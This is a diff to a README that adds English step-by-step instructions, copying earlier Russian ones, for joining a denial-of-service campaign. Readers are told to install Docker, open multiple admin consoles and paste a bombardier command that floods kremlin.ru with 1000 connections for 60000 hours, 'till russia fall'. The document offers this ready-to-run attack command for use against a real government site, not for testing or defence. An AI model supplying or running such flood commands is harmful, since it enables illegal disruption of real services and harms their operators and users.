@@ -33,3 +33,14 @@ or easiest way
 6. Скопировать скрипт (например docker run -d --rm alpine/bombardier -c 1000 -d 60000h -l http://kremlin.ru) и нажать энтер 
 7. Убедиться, что процесс пошёл 
 8. Ждать падения рашки
+
+
+Instruction for Windows and Mac: 
+1. Install Docker: https://www.docker.com/products/docker-desktop (For mac please pay attention if you download version for the correct chip) 
+2. Launch Docker and make sure that Docker is running 
+3. Go here https://github.com/almerico/bombardier/blob/main/README.md 
+4. Find in application Windows Command Prompt or Terminal for Mac and launch as an admin. 
+5. Open as many separate CMD consoles as many scripts you are going to launch (each line – one script) 
+6. Copy script (e.g. docker run -d --rm alpine/bombardier -c 1000 -d 60000h -l http://kremlin.ru) and press Enter
+7. Make sure that the process started 
+8. Wait till russia fall
